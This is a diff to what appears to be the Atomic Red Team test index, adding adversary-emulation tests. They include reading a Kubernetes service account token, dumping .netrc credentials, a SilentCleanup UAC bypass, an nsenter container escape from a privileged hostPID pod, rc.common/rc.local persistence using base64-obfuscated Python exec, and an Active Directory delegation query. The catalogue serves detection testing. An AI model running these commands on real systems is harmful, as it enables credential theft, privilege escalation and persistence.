@@ -568,6 +568,70 @@ credential-access:
 '
         name: bash
         elevation_required: false
+    - name: Cat the contents of a Kubernetes service account token file
+      auto_generated_guid: 788e0019-a483-45da-bcfe-96353d46820f
+      description: 'Access the Kubernetes service account access token stored within
+        a container in a cluster.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      - description: Verify atomic-pod is running.
+        prereq_command: 'kubectl --context kind-atomic-cluster get pods |grep atomic-pod
+
+'
+        get_prereq_command: 'kubectl --context kind-atomic-cluster run atomic-pod
+          --image=alpine --command -- sleep infinity
+
+'
+      executor:
+        command: 'kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
+
+'
+        name: sh
+        cleanup_command: kubectl --context kind-atomic-cluster delete pod atomic-pod
   T1056.004:
     technique:
       external_references:
@@ -901,6 +965,20 @@ credential-access:
           type C:\Windows\Panther\Unattend\unattend.xml
         name: command_prompt
         elevation_required: true
+    - name: Find and Access Github Credentials
+      auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
+      description: 'This test looks for .netrc files (which stores github credentials
+        in clear text )and dumps its contents if found.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      executor:
+        name: bash
+        elevation_required: false
+        command: "for file in $(find / -name .netrc 2> /dev/null);do echo $file ;
+          cat $file ; done \n"
   T1555:
     technique:
       id: attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0
@@ -10056,6 +10134,31 @@ privilege-escalation:
 '
         name: command_prompt
         elevation_required: true
+    - name: Bypass UAC using SilentCleanup task
+      auto_generated_guid: 28104f8a-4ff1-4582-bcf6-699dce156608
+      description: |
+        Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+
+        There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).
+
+        For example, we can set the windir registry kye to: "cmd /k REM "
+
+        And forcefully run SilentCleanup task:
+
+        schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+        REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path to the bat file
+          type: String
+          default: PathToAtomicsFolder\T1548.002\src\T1548.002.bat
+      executor:
+        command: "#{file_path}\n"
+        name: command_prompt
+        elevation_required: false
   T1574.012:
     technique:
       external_references:
@@ -11980,7 +12083,71 @@ privilege-escalation:
       - 'Container: Container Creation'
       - 'Process: OS API Execution'
       - 'Process: Process Creation'
-    atomic_tests: []
+      identifier: T1611
+    atomic_tests:
+    - name: Deploy container using nsenter container escape
+      auto_generated_guid: 0b2f9520-a17a-4671-9dba-3bd034099fff
+      description: |
+        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+        Additional Details:
+        - https://twitter.com/mauilion/status/1129468485480751104
+        - https://securekubernetes.com/scenario_2_attack/
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      executor:
+        command: 'kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod
+          --restart=Never -ti --rm --image alpine --overrides ''{"spec":{"hostPID":
+          true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
+          true,"tty":true,"securityContext":{"privileged":true}}]}}''
+
+'
+        name: sh
+        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+
+'
   T1546:
     technique:
       id: attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db
@@ -15236,6 +15403,48 @@ privilege-escalation:
 '
         elevation_required: true
         name: bash
+    - name: rc.common
+      auto_generated_guid: c33f3d80-5f04-419b-a13a-854d1cbdbf3a
+      description: 'Modify rc.common
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
+          sudo chmod +x /etc/rc.common
+        cleanup_command: 'origfilename=''/etc/rc.common.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common
+          && sudo rm $origfilename;fi
+
+'
+    - name: rc.local
+      auto_generated_guid: 126f71af-e1c9-405c-94ef-26a47b16c102
+      description: 'Modify rc.local
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.local
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
+          sudo chmod +x /etc/rc.local
+        cleanup_command: 'origfilename=''/etc/rc.local.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local &&
+          sudo rm $origfilename;fi
+
+'
   T1547.007:
     technique:
       created: '2020-01-24T18:15:06.641Z'
@@ -19187,6 +19396,31 @@ defense-evasion:
 '
         name: command_prompt
         elevation_required: true
+    - name: Bypass UAC using SilentCleanup task
+      auto_generated_guid: 28104f8a-4ff1-4582-bcf6-699dce156608
+      description: |
+        Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+
+        There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).
+
+        For example, we can set the windir registry kye to: "cmd /k REM "
+
+        And forcefully run SilentCleanup task:
+
+        schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+        REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path to the bat file
+          type: String
+          default: PathToAtomicsFolder\T1548.002\src\T1548.002.bat
+      executor:
+        command: "#{file_path}\n"
+        name: command_prompt
+        elevation_required: false
   T1218.003:
     technique:
       external_references:
@@ -21423,7 +21657,70 @@ defense-evasion:
       - 'Pod: Pod Creation'
       - 'Pod: Pod Modification'
       - 'Application Log: Application Log Content'
-    atomic_tests: []
+      identifier: T1610
+    atomic_tests:
+    - name: Deploy container using nsenter container escape
+      auto_generated_guid: 58004e22-022c-4c51-b4a8-2b85ac5c596b
+      description: |
+        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+        Additional Details:
+        - https://twitter.com/mauilion/status/1129468485480751104
+        - https://securekubernetes.com/scenario_2_attack/
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      executor:
+        command: 'kubectl --context kind-atomic-cluster run atomic-escape-pod --restart=Never
+          -ti --rm --image alpine --overrides ''{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
+          true,"tty":true,"securityContext":{"privileged":true}}]}}''
+
+'
+        name: sh
+        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+
+'
   T1006:
     technique:
       id: attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5
@@ -28696,11 +28993,9 @@ defense-evasion:
           description: SMTP Server IP Address
           type: string
           default: 127.0.0.1
-      dependency_executor_name: powershell
       executor:
-        command: '"Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1027
-          Atomic Test" -Attachments PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
-          -SmtpServer #{smtp_server}"
+        command: 'Send-MailMessage -From #{sender} -To #{receiver} -Subject ''T1027_Atomic_Test''
+          -Attachments #{input_file} -SmtpServer #{smtp_server}
 
 '
         name: powershell
@@ -28720,9 +29015,8 @@ defense-evasion:
           description: Destination IP address
           type: string
           default: 127.0.0.1
-      dependency_executor_name: powershell
       executor:
-        command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+        command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
 
 '
         name: powershell
@@ -42797,6 +43091,48 @@ persistence:
 '
         elevation_required: true
         name: bash
+    - name: rc.common
+      auto_generated_guid: c33f3d80-5f04-419b-a13a-854d1cbdbf3a
+      description: 'Modify rc.common
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
+          sudo chmod +x /etc/rc.common
+        cleanup_command: 'origfilename=''/etc/rc.common.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common
+          && sudo rm $origfilename;fi
+
+'
+    - name: rc.local
+      auto_generated_guid: 126f71af-e1c9-405c-94ef-26a47b16c102
+      description: 'Modify rc.local
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.local
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
+          sudo chmod +x /etc/rc.local
+        cleanup_command: 'origfilename=''/etc/rc.local.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local &&
+          sudo rm $origfilename;fi
+
+'
   T1542.004:
     technique:
       created: '2020-10-20T00:05:48.790Z'
@@ -49191,6 +49527,49 @@ discovery:
 
 '
         name: command_prompt
+    - name: Enumerate Active Directory for Unconstrained Delegation
+      auto_generated_guid: 46f8dbe9-22a5-4770-8513-66119c5be63b
+      description: |
+        Attackers may attempt to query for computer objects with the UserAccountControl property
+        'TRUSTED_FOR_DELEGATION' (0x80000;524288) set
+        More Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce
+        Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Domain FQDN
+          type: String
+          default: contoso.com
+        uac_prop:
+          description: UAC Property to search
+          type: String
+          default: 524288
+      dependencies:
+      - description: 'PowerShell ActiveDirectory Module must be installed
+
+'
+        prereq_command: |
+          Try {
+              Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
+              exit 0
+          }
+          Catch {
+              exit 1
+          }
+        get_prereq_command: |
+          if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+            Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+          } else {
+            Install-WindowsFeature RSAT-AD-PowerShell
+          }
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'Get-ADObject -LDAPFilter ''(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})''
+          -Server #{domain}
+
+'
   T1069.002:
     technique:
       external_references:
@@ -57132,7 +57511,70 @@ execution:
       - 'Pod: Pod Creation'
       - 'Pod: Pod Modification'
       - 'Application Log: Application Log Content'
-    atomic_tests: []
+      identifier: T1610
+    atomic_tests:
+    - name: Deploy container using nsenter container escape
+      auto_generated_guid: 58004e22-022c-4c51-b4a8-2b85ac5c596b
+      description: |
+        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+        Additional Details:
+        - https://twitter.com/mauilion/status/1129468485480751104
+        - https://securekubernetes.com/scenario_2_attack/
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      executor:
+        command: 'kubectl --context kind-atomic-cluster run atomic-escape-pod --restart=Never
+          -ti --rm --image alpine --overrides ''{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
+          true,"tty":true,"securityContext":{"privileged":true}}]}}''
+
+'
+        name: sh
+        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+
+'
   T1559.002:
     technique:
       created: '2020-02-12T14:10:50.699Z'
